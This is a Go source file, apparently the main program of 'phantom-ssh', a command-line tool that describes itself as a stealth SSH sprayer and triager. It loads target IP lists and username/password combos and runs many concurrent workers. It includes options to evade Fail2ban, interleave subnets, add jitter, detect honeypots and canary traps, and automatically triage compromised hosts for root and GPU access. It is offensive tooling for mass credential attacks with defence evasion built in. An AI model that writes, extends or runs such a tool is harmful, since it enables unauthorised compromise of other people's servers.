package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"phantom-ssh/pkg/engine"
	"phantom-ssh/pkg/honeypot"
	"phantom-ssh/pkg/ui"

	"github.com/spf13/pflag"
)

const AppVersion = "1.0.0"

func main() {
	// Flags definition
	targetFlag := pflag.StringP("targets", "t", "", "Path to targets file (IP:PORT or IP, e.g. SSH.txt)")
	userFlag := pflag.StringP("users", "u", "", "Path to usernames file, or a single username")
	passFlag := pflag.StringP("passwords", "p", "", "Path to passwords file, or a single password")
	comboFlag := pflag.StringP("combos", "C", "", "Path to combo file (user:pass or user pass)")
	workersFlag := pflag.IntP("workers", "w", 100, "Number of concurrent worker threads")
	timeoutFlag := pflag.Int("timeout", 3, "Connection and authentication timeout in seconds")
	maxTriesFlag := pflag.Int("max-tries", 2, "Max attempts per host to evade Fail2ban (0 = unlimited)")
	noInterleaveFlag := pflag.Bool("no-interleave", false, "Disable /24 subnet interleaving")
	noCanaryFlag := pflag.Bool("no-canary", false, "Disable canary authentication trap detection")
	noTriageFlag := pflag.Bool("no-triage", false, "Disable automated post-exploit hardware triage")
	jitterFlag := pflag.Int("jitter", 0, "Max random jitter in milliseconds between probes")
	outputFlag := pflag.StringP("output", "o", "./results", "Output directory for results (goods, root, gpu, honeypots)")
	noTUIFlag := pflag.Bool("no-tui", false, "Disable TUI dashboard, print raw hits to stdout")
	quietFlag := pflag.Bool("quiet", false, "Quiet mode: suppress non-essential output")
	interactiveFlag := pflag.BoolP("interactive", "i", false, "Force interactive configuration wizard")
	versionFlag := pflag.BoolP("version", "v", false, "Display phantom-ssh version")

	pflag.Parse()

	if *versionFlag {
		fmt.Printf("phantom-ssh v%s (Stealth SSH Sprayer & Triager)\n", AppVersion)
		return
	}

	var cfg *engine.Config

	// If no core arguments are supplied or -i is requested, enter interactive wizard
	if *interactiveFlag || (*targetFlag == "" && *comboFlag == "" && *userFlag == "" && *passFlag == "") {
		var err error
		cfg, err = ui.RunInteractiveWizard()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Wizard error: %v\n", err)
			os.Exit(1)
		}
	} else {
		// Build config from flags
		cfg = &engine.Config{
			TargetFile:      *targetFlag,
			ComboFile:       *comboFlag,
			Workers:         *workersFlag,
			Timeout:         time.Duration(*timeoutFlag) * time.Second,
			MaxTriesPerHost: *maxTriesFlag,
			Interleave:      !*noInterleaveFlag,
			CanaryCheck:     !*noCanaryFlag,
			AutoTriage:      !*noTriageFlag,
			MaxJitterMs:     *jitterFlag,
			OutputDir:       *outputFlag,
		}

		// Handle user/pass (file or single string)
		if *userFlag != "" {
			if _, err := os.Stat(*userFlag); err == nil {
				cfg.UserFile = *userFlag
			} else {
				cfg.SingleUser = *userFlag
			}
		}

		if *passFlag != "" {
			if _, err := os.Stat(*passFlag); err == nil {
				cfg.PassFile = *passFlag
			} else {
				cfg.SinglePass = *passFlag
			}
		}
	}

	// Load targets
	if cfg.TargetFile == "" {
		fmt.Fprintf(os.Stderr, "[-] Error: target file is required (-t, --targets)\n")
		os.Exit(1)
	}

	targets, err := engine.LoadTargets(cfg.TargetFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to load targets: %v\n", err)
		os.Exit(1)
	}
	if len(targets) == 0 {
		fmt.Fprintf(os.Stderr, "[-] Targets file is empty: %s\n", cfg.TargetFile)
		os.Exit(1)
	}

	// Load credentials
	creds, err := engine.LoadCredentials(cfg.UserFile, cfg.PassFile, cfg.ComboFile, cfg.SingleUser, cfg.SinglePass)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to load credentials: %v\n", err)
		os.Exit(1)
	}
	if len(creds) == 0 {
		fmt.Fprintf(os.Stderr, "[-] No valid credentials loaded\n")
		os.Exit(1)
	}

	// Setup UI
	terminalUI := ui.NewUI(*noTUIFlag, *quietFlag)

	// Callback for real-time hits
	onHit := func(target, user, pass string, isHoneypot bool, probe *honeypot.ShellProbeResult, rtt time.Duration) {
		terminalUI.AddHit(target, user, pass, isHoneypot, probe, rtt)
	}

	// Initialize Engine
	eng, err := engine.NewEngine(cfg, onHit)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Engine init error: %v\n", err)
		os.Exit(1)
	}

	// Setup graceful interrupt handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		if !*quietFlag {
			fmt.Println("\n\033[33;1m[!] Interrupt received (Ctrl+C). Gracefully draining active connections...\033[0m")
		}
		eng.Stop()
	}()

	// Start UI dashboard
	terminalUI.StartDashboard(eng)

	// Run Engine
	runErr := eng.Run(targets, creds)

	// Stop UI dashboard
	terminalUI.StopDashboard(eng)

	if runErr != nil {
		fmt.Fprintf(os.Stderr, "[-] Execution error: %v\n", runErr)
		os.Exit(1)
	}

	st := eng.GetStats()
	fmt.Printf("\n╔══════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                     SCAN COMPLETED                           ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Total Probes : %-45d ║\n", st.CompletedTasks)
	fmt.Printf("║ Valid Hits   : %-45d ║\n", st.Goods)
	fmt.Printf("║ Honeypots    : %-45d ║\n", st.Honeypots)
	fmt.Printf("║ F2B Guarded  : %-45d ║\n", st.SkippedF2B)
	fmt.Printf("║ Elapsed Time : %-45s ║\n", time.Since(st.StartTime).Round(time.Second))
	fmt.Printf("║ Output Path  : %-45s ║\n", cfg.OutputDir)
	fmt.Printf("╚══════════════════════════════════════════════════════════════╝\n")
}
